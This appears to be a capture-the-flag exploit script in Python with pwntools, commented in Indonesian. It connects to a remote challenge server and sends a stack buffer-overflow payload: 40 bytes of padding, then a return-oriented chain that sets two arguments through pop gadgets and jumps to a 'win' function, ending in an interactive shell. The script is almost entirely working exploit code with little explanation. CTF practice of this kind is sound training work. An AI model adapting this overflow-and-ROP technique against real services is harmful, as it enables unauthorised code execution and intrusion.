from pwn import *

# Koneksi
# p = process('./chall')
p = remote('ctf-chall.stembascc.com', 5204)

# Gadgets dan addresses
pop_rdi = 0x40129b
pop_rsi_r15 = 0x401299
win_addr = 0x4011c3

# Build payload
payload = b'A' * 40  # padding sampai return address
payload += p64(pop_rdi)
payload += p64(0xcafe)  # arg1 untuk win
payload += p64(pop_rsi_r15)
payload += p64(0x1337)  # arg2 untuk win
payload += p64(0x0)     # dummy value untuk r15
payload += p64(win_addr)

# Send payload
p.sendlineafter(b'Payload:', payload)

# Get shell
p.interactive()
